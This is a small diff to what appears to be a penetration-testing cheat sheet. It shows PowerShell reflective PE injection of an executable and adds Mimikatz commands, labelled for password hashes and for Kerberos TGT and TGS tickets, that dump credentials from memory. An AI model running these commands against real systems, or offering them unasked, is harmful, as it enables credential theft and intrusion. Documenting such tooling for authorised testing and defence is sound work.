@@ -97,6 +97,9 @@ Load DemoEXE and run it locally.
 $PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')  
 Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4"
 ```
+password hash:
 1. privilege::debug
 2. sekurlsa::logonpasswords
+TGT and TGS:
+1. sekurlsa::tickets
 ```
